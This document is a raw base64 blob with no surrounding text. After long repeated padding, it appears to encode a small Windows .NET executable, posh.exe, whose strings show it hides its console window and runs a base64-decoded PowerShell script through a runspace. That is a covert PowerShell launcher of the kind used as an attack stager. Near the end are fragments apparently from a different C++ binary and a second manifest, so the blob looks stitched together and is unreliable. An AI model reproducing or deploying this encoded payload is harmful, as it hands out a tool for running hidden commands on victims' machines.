BBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQAAAE1akAADAAAABAAAAP//AAC4AAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAw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5kbGwAdXNlcjMyLmRsbABTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uAFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzAFJ1bnNwYWNlRmFjdG9yeQBSdW5zcGFjZQBDcmVhdGVSdW5zcGFjZQBPcGVuAFJ1bnNwYWNlSW52b2tlAFBpcGVsaW5lAENyZWF0ZVBpcGVsaW5lAENvbW1hbmRDb2xsZWN0aW9uAGdldF9Db21tYW5kcwBBZGRTY3JpcHQAU3lzdGVtLkNvbGxlY3Rpb25zLk9iamVjdE1vZGVsAENvbGxlY3Rpb25gMQBQU09iamVjdABJbnZva2UAQ2xvc2UAU3lzdGVtLlRleHQAU3RyaW5nQnVpbGRlcgBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYwBJRW51bWVyYXRvcmAxAEdldEVudW1lcmF0b3IAZ2V0X0N1cnJlbnQAQXBwZW5kAFN5c3RlbS5Db2xsZWN0aW9ucwBJRW51bWVyYXRvcgBNb3ZlTmV4dABJRGlzcG9zYWJsZQBEaXNwb3NlAFRvU3RyaW5nAFN0cmluZwBUcmltAEVuY29kaW5nAGdldF9Vbmljb2RlAENvbnZlcnQARnJvbUJhc2U2NFN0cmluZwBHZXRTdHJpbmcAAAADIAAAAAAAEia8UX96xUKNIcRtUFz57wAIt3pcVhk04IkCBggEAAAAAAQFAAAAAwAAGAUAAgIYCAMgAAEEAAEODgQAAQEOAwAAAQQgAQEIBCABAQ4IMb84Vq02TjUEAAASGQUgAQESGQQgABIhBCAAEiUIIAAVEikBEi0GFRIpARItCCAAFRI1ARMABhUSNQESLQQgABMABSABEjEcAyAAAgMgAA4aBwkSGRIdEiEVEikBEi0SMRItDhUSNQESLQIEAAASRQUAAR0FDgUgAQ4dBQQHAhgOAwcBGAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEAvCgAAAAAAAAAAAAA3igAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAoAAAAAAAAAAAAAAAAAAAAAAAAAABfQ29yRXhlTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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